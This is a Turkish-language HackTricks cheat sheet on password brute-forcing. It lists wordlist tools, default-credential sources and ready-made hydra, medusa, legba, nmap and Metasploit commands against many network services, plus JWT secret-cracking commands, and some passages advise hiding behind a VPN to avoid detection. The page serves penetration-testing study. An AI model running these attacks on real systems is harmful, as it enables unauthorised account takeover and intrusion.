# Brute Force - Hile Kağıdı

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturabilir ve otomatikleştirebilirsiniz.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>

## Varsayılan Kimlik Bilgileri

Kullanılan teknolojinin varsayılan kimlik bilgilerini aramak için **Google'da arama yapın** veya **bu bağlantıları deneyin**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Kendi Sözlüklerinizi Oluşturun**

Hedefle ilgili olarak mümkün olduğunca fazla bilgi bulun ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl, bir hedef web sitesinden metin çekmek için kullanılan bir araçtır. Bu araç, web sitesinin içeriğini analiz eder ve belirli bir kelime veya kelime grubunu içeren metinleri toplar. Bu, bir saldırganın hedef web sitesindeki kullanıcı adları, e-posta adresleri veya diğer hassas bilgileri bulmasına yardımcı olabilir.

Cewl'ün kullanımı oldukça basittir. İlk olarak, hedef web sitesinin URL'sini belirtmeniz gerekmektedir. Ardından, araştırmak istediğiniz kelime veya kelime grubunu belirleyin. Cewl, web sitesinin içeriğini tarayacak ve belirtilen kelime veya kelime grubunu içeren metinleri toplayacaktır.

Cewl'ün çıktısı, toplanan metinleri içeren bir dosyadır. Bu dosyayı daha sonra analiz etmek veya başka bir saldırı yöntemi için kullanmak için kullanabilirsiniz. Cewl, bir hedef web sitesinin içeriğini hızlı bir şekilde tarayarak, saldırganlara hedefe yönelik daha spesifik saldırılar yapma imkanı sağlar.

Cewl, bir brute force saldırısı için önemli bir kaynak olabilir. Saldırganlar, topladıkları metinleri kullanarak kullanıcı adı ve şifre kombinasyonlarını deneyebilirler. Bu, zayıf şifreler kullanan kullanıcı hesaplarını ele geçirmek için kullanılan yaygın bir saldırı yöntemidir.

Cewl, bir saldırganın hedef web sitesindeki metinleri toplamasına yardımcı olan güçlü bir araçtır. Ancak, bu aracın yasal ve etik kullanımlarını hatırlamak önemlidir. Sadece yasal izinlerle ve etik sınırlar içinde kullanılmalıdır.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Kurban hakkındaki bilgilerinize dayanarak şifreler oluşturun (isimler, tarihler...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister, bir kelime listesi oluşturma aracıdır. Bu araç, belirli bir hedefle ilgili olarak kullanmak için benzersiz ve ideal bir kelime listesi oluşturmanıza olanak tanır. Verilen kelimelerden birden fazla varyasyon oluşturmanıza imkan sağlar.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Kelime Listeleri

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Hizmetler

Hizmet adına göre alfabetik olarak sıralanmıştır.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
#### AJP

AJP (Apache JServ Protocol) is a protocol used by Apache Tomcat to communicate with web servers. It is similar to the HTTP protocol but is more efficient for communication between the web server and the application server.

A common vulnerability in AJP is the ability to perform a brute force attack on the AJP port (usually port 8009). Brute force attacks involve systematically trying all possible combinations of usernames and passwords until the correct credentials are found.

To perform a brute force attack on the AJP port, you can use tools like Hydra or Burp Suite. These tools allow you to automate the process of trying different usernames and passwords.

When performing a brute force attack on the AJP port, it is important to use a strong password list and to set a reasonable delay between each attempt to avoid detection. Additionally, it is recommended to use a VPN or proxy to hide your IP address and avoid being blocked by the target server.

If successful, a brute force attack on the AJP port can allow an attacker to gain unauthorized access to the application server and potentially compromise the entire system. Therefore, it is important to ensure that strong passwords are used and that the AJP port is properly secured to prevent brute force attacks.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM ve Solace)

AMQP (Advanced Message Queuing Protocol - Gelişmiş Mesaj Sıralama Protokolü), mesaj tabanlı uygulamalar arasında güvenli ve etkili bir iletişim sağlamak için kullanılan bir protokoldür. AMQP, birçok popüler mesaj sıralama sistemini destekler, bunlar arasında ActiveMQ, RabbitMQ, Qpid, JORAM ve Solace bulunur.

Bu sistemlerin birçoğu, kullanıcı kimlik doğrulama ve yetkilendirme için kullanıcı adı ve parola tabanlı bir mekanizma sunar. Brute force saldırıları, bu sistemlere yetkisiz erişim sağlamak için kullanılabilir. Brute force saldırıları, bir kullanıcının hesabına birden çok parola deneyerek giriş yapmaya çalışır.

Brute force saldırılarına karşı korunmak için, güçlü ve karmaşık parolalar kullanılmalıdır. Ayrıca, hesap kilitlenme politikaları ve oturum süreleri gibi güvenlik önlemleri de uygulanmalıdır.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
# Cassandra

Cassandra, Apache tarafından geliştirilen ve dağıtılmış bir veritabanı yönetim sistemidir. Büyük ölçekli ve yüksek performanslı uygulamalar için tasarlanmıştır. Cassandra, dağıtılmış mimarisi sayesinde yüksek ölçeklenebilirlik ve yüksek kullanılabilirlik sağlar.

Cassandra'nın güvenliği, kullanıcı kimlik doğrulama ve yetkilendirme mekanizmalarıyla sağlanır. Kullanıcılar, roller ve izinler aracılığıyla veritabanına erişim kontrolü yapabilirler.

Brute force saldırıları, Cassandra'nın güvenliğini zayıflatabilir. Brute force saldırısı, tüm olası kombinasyonları deneyerek kullanıcı adı ve şifreleri tahmin etmeye çalışır. Bu saldırı türü, zayıf veya tahmin edilebilir şifreler kullanıldığında etkili olabilir.

Cassandra'da brute force saldırılarını önlemek için bazı önlemler alınabilir. Bunlar şunları içerir:

- Güçlü şifre politikaları uygulamak: Kullanıcıların karmaşık ve tahmin edilemez şifreler kullanmalarını sağlamak için şifre politikaları belirlenmelidir.
- Kullanıcı hesaplarını kilitlenme: Belirli bir süre boyunca yanlış şifre denemeleri yapan kullanıcı hesaplarını otomatik olarak kilitlenmek.
- İki faktörlü kimlik doğrulama kullanmak: Kullanıcıların şifrelerinin yanı sıra bir doğrulama kodu veya anahtar kullanarak kimliklerini doğrulamalarını sağlamak.

Bu önlemler, brute force saldırılarını önlemeye yardımcı olabilir ve Cassandra'nın güvenliğini artırabilir. Ancak, güvenlik açıklarını tespit etmek ve düzeltmek için düzenli olarak güvenlik denetimleri yapmak önemlidir.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
#### Brute Force

CouchDB is a NoSQL database that can be vulnerable to brute force attacks if weak or default credentials are used. Brute forcing is a technique where an attacker systematically tries all possible combinations of usernames and passwords until the correct one is found.

To perform a brute force attack on CouchDB, you can use tools like Hydra or Medusa. These tools allow you to automate the process of trying different username and password combinations against the CouchDB login page.

Here is an example command using Hydra:

```plaintext
hydra -L users.txt -P passwords.txt <target_ip> http-post-form "/_session:username=^USER^&password=^PASS^:F=incorrect" -V
```

In this command, `users.txt` and `passwords.txt` are files containing a list of usernames and passwords to try. `<target_ip>` should be replaced with the IP address of the CouchDB server.

It is important to note that brute forcing is a time-consuming process and may be detected by intrusion detection systems (IDS) or rate limiting mechanisms. Therefore, it is recommended to use a targeted approach, such as using a wordlist that includes common passwords or trying default credentials.

If successful, a brute force attack can give an attacker unauthorized access to the CouchDB database, allowing them to view, modify, or delete data. To protect against brute force attacks, it is essential to use strong, unique passwords and consider implementing additional security measures such as account lockouts or multi-factor authentication.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

Docker Registry, Docker imajlarını depolamak ve paylaşmak için kullanılan bir bileşendir. Docker Registry, Docker Hub gibi bir bulut hizmeti olarak kullanılabilir veya kendi özel Docker Registry'nizi oluşturabilirsiniz.

Docker Registry'ye erişmek için, Docker istemcisini kullanarak imajları çekebilir ve gönderebilirsiniz. Docker Registry'ye erişmek için yetkilendirme gerektiğinde, kullanıcı adı ve parola veya bir kimlik doğrulama belirteci kullanmanız gerekebilir.

Docker Registry'ye brute force saldırıları, kullanıcı adı ve parola kombinasyonlarını deneyerek yetkilendirme bilgilerini elde etmeye çalışır. Bu saldırı türü, zayıf veya tahmin edilebilir parolaları hedef alır ve otomatik olarak bir dizi kullanıcı adı ve parola kombinasyonunu deneyerek başarılı bir giriş yapmayı hedefler.

Docker Registry'ye brute force saldırılarından korunmak için güçlü ve karmaşık parolalar kullanmanız önemlidir. Ayrıca, kullanıcı adı ve parola kombinasyonlarını sınırlayan bir giriş deneme sınırı ayarlamak da faydalı olabilir.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch, açık kaynaklı bir arama ve analiz motorudur. Genellikle büyük miktarda veriyi hızlı bir şekilde depolamak, aramak ve analiz etmek için kullanılır. Elasticsearch, dağıtık bir yapıya sahiptir ve verileri parçalara ayırarak birden fazla düğümde depolar. Bu sayede yüksek performans ve ölçeklenebilirlik sağlar.

Elasticsearch, RESTful API üzerinden iletişim kurar ve JSON formatında veri alışverişi yapar. Bu sayede farklı programlama dilleri ve platformlar arasında kolayca entegre edilebilir.

Elasticsearch, genellikle log analizi, metin arama, gerçek zamanlı analiz gibi uygulamalarda kullanılır. Ayrıca, Elasticsearch'in güçlü sorgulama yetenekleri sayesinde karmaşık sorgular yapmak da mümkündür.

Elasticsearch, güvenlik önlemleriyle donatılmıştır. Kullanıcı yetkilendirmesi, erişim kontrol listeleri ve şifreleme gibi özellikler sunar. Ancak, hatalı yapılandırma veya zayıf şifreler gibi güvenlik açıkları, Elasticsearch'e karşı brute force saldırılarına yol açabilir.

Brute force saldırısı, bir hedef sistemdeki kullanıcı hesaplarının şifrelerini tahmin etmek için otomatik olarak bir dizi olası şifre denemesi yapma yöntemidir. Elasticsearch üzerinde brute force saldırısı gerçekleştirmek için çeşitli araçlar ve yöntemler mevcuttur.

Brute force saldırılarını önlemek için, Elasticsearch'in güvenlik ayarlarının doğru bir şekilde yapılandırılması önemlidir. Güçlü şifreler kullanılmalı, kullanıcı hesapları için sınırlamalar getirilmeli ve giriş denemeleri için otomatik engelleme mekanizmaları etkinleştirilmelidir.

Ayrıca, Elasticsearch sunucusuna erişimi sınırlamak için güvenlik duvarı veya ağ düzeyindeki diğer önlemler de alınmalıdır. Güncellemelerin düzenli olarak uygulanması ve güvenlik açıklarının izlenmesi de önemlidir.

Sonuç olarak, Elasticsearch'in güvenliğini sağlamak için doğru yapılandırma ve güvenlik önlemlerinin alınması gerekmektedir. Brute force saldırılarına karşı korunmak için güçlü şifreler kullanılmalı ve giriş denemeleri için otomatik engelleme mekanizmaları etkinleştirilmelidir.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol), dosya transferi için kullanılan bir ağ protokolüdür. Bir sunucu ve bir istemci arasında dosya transferi yapmak için kullanılır. FTP, sunucuya bağlanmak ve dosyaları yüklemek veya indirmek için kullanıcı adı ve parola gerektirir.

#### Brute Force Saldırısı

Brute force saldırısı, bir hesaba veya sisteme yetkisiz erişim elde etmek için tüm olası kombinasyonları deneyerek gerçekleştirilen bir saldırı türüdür. FTP brute force saldırısı, bir saldırganın FTP sunucusuna erişmek için tüm olası kullanıcı adı ve parola kombinasyonlarını denemesini içerir.

#### FTP Brute Force Saldırısını Gerçekleştirmek

FTP brute force saldırısını gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:

1. Hedef FTP sunucusunun IP adresini belirleyin.
2. Bir brute force aracı kullanarak kullanıcı adı ve parola kombinasyonlarını denemek için bir wordlist oluşturun.
3. Brute force aracını kullanarak hedef FTP sunucusuna tüm olası kombinasyonları deneyin.
4. Başarılı bir şekilde kullanıcı adı ve parolayı bulduğunuzda, hedef FTP sunucusuna yetkisiz erişim elde etmiş olursunuz.

#### FTP Brute Force Saldırısını Önlemek

FTP brute force saldırısını önlemek için aşağıdaki önlemleri alabilirsiniz:

1. Güçlü ve karmaşık parolalar kullanın.
2. Oturum açma denemelerini sınırlayın ve belirli bir süre boyunca hesabı kilitli tutun.
3. IP adresi tabanlı erişim kontrolü kullanarak sadece güvenilir IP adreslerinden gelen bağlantılara izin verin.
4. FTP sunucusunu güncel tutun ve güvenlik yamalarını düzenli olarak uygulayın.
5. İki faktörlü kimlik doğrulama kullanarak güvenliği artırın.

FTP brute force saldırısı, zayıf parolaları hedef alır ve yetkisiz erişim elde etmek için çok sayıda deneme yapar. Bu nedenle, güçlü parolalar kullanmak ve güvenlik önlemlerini uygulamak önemlidir.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Genel Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Temel Kimlik Doğrulama
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM, Windows NT LAN Manager, bir kimlik doğrulama protokolüdür. NTLM, Windows işletim sistemlerinde kullanılan bir güvenlik mekanizmasıdır. NTLM, HTTP üzerinden kimlik doğrulama yapmak için kullanılabilir.

NTLM kimlik doğrulama, kullanıcı adı ve şifre kombinasyonunu kullanarak kimlik doğrulama yapar. Bu kimlik doğrulama yöntemi, brute force saldırılarına karşı savunmasız olabilir. Brute force saldırıları, tüm olası şifre kombinasyonlarını deneyerek doğru şifreyi bulmaya çalışır.

NTLM brute force saldırıları, genellikle bir wordlist veya şifre kombinasyonları listesi kullanılarak gerçekleştirilir. Saldırgan, hedefin NTLM kimlik doğrulama sunucusuna doğrudan erişim sağlamak için bir HTTP isteği gönderir. Ardından, saldırgan, wordlist veya şifre kombinasyonları listesindeki her bir şifreyi deneyerek doğru şifreyi bulmaya çalışır.

NTLM brute force saldırılarına karşı korunmak için, güçlü ve karmaşık şifreler kullanılmalıdır. Ayrıca, hesap kilitlenme politikaları ve oturum süreleri gibi güvenlik önlemleri de uygulanmalıdır.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post Form

#### Introduction

HTTP Post Form is a common method used to send data to a server. It is widely used in web applications for various purposes, such as submitting login credentials, submitting search queries, or submitting data to be processed.

#### Brute Forcing HTTP Post Forms

Brute forcing HTTP Post Forms involves systematically trying different combinations of input values in order to find the correct combination that allows access to a protected resource or performs a specific action.

#### Steps to Brute Force HTTP Post Forms

1. Identify the target: Determine the URL of the target web application and locate the login or form submission page.

2. Analyze the form: Inspect the HTML source code of the form to identify the input fields and their corresponding names.

3. Prepare a wordlist: Create a wordlist containing possible values for each input field. This can include common passwords, dictionary words, or any other relevant values.

4. Automate the process: Use a tool or script to automate the process of sending HTTP Post requests with different combinations of input values from the wordlist.

5. Handle responses: Analyze the responses received from the server to determine if the attempted combination was successful. This can be done by checking for specific error messages, redirects, or changes in the application's behavior.

6. Iterate and refine: Repeat the process with different wordlists or modify the existing wordlist based on the observed responses. This helps to increase the chances of finding the correct combination.

#### Tips for Brute Forcing HTTP Post Forms

- Use a tool or script that allows for rate limiting to avoid triggering account lockouts or IP bans.

- Prioritize input fields that are more likely to contain sensitive information, such as usernames or passwords.

- Consider using a proxy or VPN to hide your IP address and avoid detection.

- Be mindful of legal and ethical considerations when performing brute force attacks. Always obtain proper authorization and ensure you are not violating any laws or regulations.

#### Conclusion

Brute forcing HTTP Post Forms can be an effective technique for gaining unauthorized access or discovering vulnerabilities in web applications. However, it is important to use this technique responsibly and within the boundaries of the law. Always obtain proper authorization and exercise caution to avoid causing harm or legal consequences.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
http**s** için "http-post-form"dan "**https-post-form"** olarak değiştirmeniz gerekmektedir.

### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal veya (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
IMAP (Internet Message Access Protocol), bir e-posta istemcisi ve e-posta sunucusu arasında iletişim kurmak için kullanılan bir protokoldür. IMAP, e-posta mesajlarını sunucuda tutar ve istemciye sadece gerekli olanları gönderir. Bu, e-postaların istemci cihazda depolanmasını gerektirmez ve birden fazla cihaz arasında senkronizasyon sağlar.

IMAP brute force saldırısı, bir saldırganın IMAP sunucusuna birden fazla kullanıcı adı ve şifre kombinasyonu deneyerek yetkisiz erişim elde etmeye çalıştığı bir saldırı türüdür. Bu saldırı, zayıf şifreler veya kullanıcı adı ve şifre kombinasyonlarının tahmin edilebilir olması durumunda etkili olabilir.

IMAP brute force saldırısını gerçekleştirmek için, saldırgan bir brute force aracı kullanır ve hedef IMAP sunucusuna bağlanır. Ardından, farklı kullanıcı adı ve şifre kombinasyonlarını denemek için otomatik olarak istekler gönderir. Saldırgan, doğru kullanıcı adı ve şifre kombinasyonunu bulana kadar bu işlemi tekrarlar.

Bu tür bir saldırıya karşı korunmanın en iyi yolu, güçlü ve karmaşık şifreler kullanmaktır. Ayrıca, IMAP sunucusunda oturum açma denemelerini sınırlayan bir güvenlik önlemi uygulamak da faydalı olabilir.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
IRC (Internet Relay Chat), İnternet üzerinde gerçek zamanlı sohbet etmek için kullanılan bir protokoldür. IRC sunucuları ve istemcileri kullanılarak birçok kişi aynı anda sohbet edebilir. IRC, farklı kanallarda sohbet etmeyi ve özel mesajlar göndermeyi sağlar.

IRC sunucuları genellikle belirli bir ağda barındırılır ve kullanıcılar bu sunuculara bağlanarak sohbet edebilir. IRC istemcileri, kullanıcıların sunuculara bağlanmasını ve sohbet etmesini sağlar.

IRC brute force saldırısı, bir saldırganın IRC hesaplarının şifrelerini tahmin etmek için otomatik olarak bir dizi olası şifre denemesi yapmasını içerir. Bu saldırı, zayıf veya tahmin edilebilir şifreler kullanan kullanıcıları hedef alır.

IRC brute force saldırılarını önlemek için güçlü ve karmaşık şifreler kullanmak önemlidir. Ayrıca, hesaplarınızı korumak için iki faktörlü kimlik doğrulama gibi ek güvenlik önlemleri kullanmanız önerilir.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
#### ISCSI

ISCSI (Internet Small Computer System Interface) bir ağ protokolüdür ve SCSI (Small Computer System Interface) komutlarını TCP/IP üzerinden iletmek için kullanılır. Bu protokol, depolama alanı ağları (SAN) üzerindeki depolama cihazlarına erişim sağlar.

ISCSI, bir sunucunun uzaktaki bir depolama cihazına bağlanmasını sağlar ve bu cihazı yerel bir depolama birimi gibi kullanmasına olanak tanır. Bu, sunucuların depolama kaynaklarını paylaşmasını ve merkezi bir depolama havuzuna erişim sağlamasını sağlar.

ISCSI brute force saldırısı, bir saldırganın ISCSI protokolünü kullanarak bir hedef sunucuya erişmek için bir dizi olası kimlik bilgisi kombinasyonunu denemesidir. Bu saldırı, zayıf veya tahmin edilebilir kimlik bilgileri kullanılarak korunan bir ISCSI hedefine erişmek için kullanılabilir.

Bu saldırı türü, saldırganın hedef sunucunun ISCSI hizmetine erişmek için bir dizi kullanıcı adı ve parola kombinasyonunu otomatik olarak denemesini gerektirir. Saldırgan, doğru kimlik bilgilerini bulana kadar farklı kombinasyonları denemeye devam eder.

ISCSI brute force saldırıları, güçlü kimlik doğrulama önlemleri alınmadığında etkili olabilir. Bu nedenle, güvenlik bilincine sahip olmak ve güçlü kimlik doğrulama politikaları uygulamak önemlidir.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
JWT (JSON Web Token), JSON Web Token olarak da bilinir, web uygulamalarında kullanılan bir kimlik doğrulama mekanizmasıdır. JWT'ler, kullanıcıların kimlik bilgilerini güvenli bir şekilde taşımak için kullanılır. JWT'ler, bir başlık, bir pay yükü ve bir imza olmak üzere üç bölümden oluşur.

#### JWT Yapısı

JWT'nin yapısı şu şekildedir:

1. Başlık (Header): JWT'nin türünü (typ) ve kullanılan algoritmayı (alg) içerir. Başlık, Base64 URL güvenli bir şekilde kodlanmıştır.

2. Pay Yükü (Payload): JWT'de taşınan verileri içerir. Pay yükü, kullanıcıya özgü bilgileri (id, ad, rol vb.) içerebilir. Pay yükü de Base64 URL güvenli bir şekilde kodlanmıştır.

3. İmza (Signature): JWT'nin doğrulama amacıyla kullanılan bir imzadır. İmza, başlık ve pay yükünün birleştirilip belirli bir algoritma ile şifrelenmesiyle oluşturulur.

#### JWT Kullanımı

JWT'ler, kullanıcı kimlik doğrulaması ve yetkilendirme için kullanılır. Bir kullanıcı başarılı bir şekilde kimlik doğrulandığında, sunucu bir JWT oluşturur ve bu JWT'yi kullanıcıya verir. Kullanıcı, bu JWT'yi her istekte sunucuya gönderir ve sunucu bu JWT'yi doğrularak kullanıcının yetkilendirilip yetkilendirilmediğini kontrol eder.

JWT'lerin avantajları şunlardır:

- Taşınabilirlik: JWT'ler, kullanıcı kimlik bilgilerini taşımak için kullanıldığından, kullanıcılar farklı sunucular arasında gezinebilirler.

- Güvenlik: JWT'ler, imzaları sayesinde doğrulama ve bütünlük sağlar. Bu sayede, JWT'lerin içeriği değiştirilmediği sürece güvenli bir şekilde kullanılabilirler.

- Ölçeklenebilirlik: JWT'ler, sunucu tarafında saklanması gereken oturum bilgilerini taşımadığından, sunucu tarafında herhangi bir durum saklamak zorunda kalmaz.

#### JWT Brute Force Saldırıları

JWT'lerin güvenliği, kullanılan algoritmanın güvenliği ve JWT'nin doğru şekilde uygulanmasına bağlıdır. Brute force saldırıları, JWT'nin imza bölümünü tahmin etmek için tüm olası kombinasyonları deneyerek gerçekleştirilir.

JWT brute force saldırılarını önlemek için aşağıdaki önlemler alınabilir:

- Güçlü bir şifreleme algoritması kullanmak: Güvenilir ve güçlü bir şifreleme algoritması kullanmak, brute force saldırılarını zorlaştırır.

- Uzun ve karmaşık anahtarlar kullanmak: Uzun ve karmaşık anahtarlar, brute force saldırılarını daha zor hale getirir.

- İmza doğrulama sürecini güçlendirmek: İmza doğrulama sürecini güçlendirmek, brute force saldırılarını önlemeye yardımcı olur.

- İmza doğrulama sürecini sınırlamak: İmza doğrulama sürecini sınırlamak, brute force saldırılarını sınırlar ve saldırganların deneme sayısını azaltır.

JWT brute force saldırılarına karşı korunmak için bu önlemler alınmalıdır. Ayrıca, JWT'lerin güvenli bir şekilde saklanması ve iletilmesi de önemlidir.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
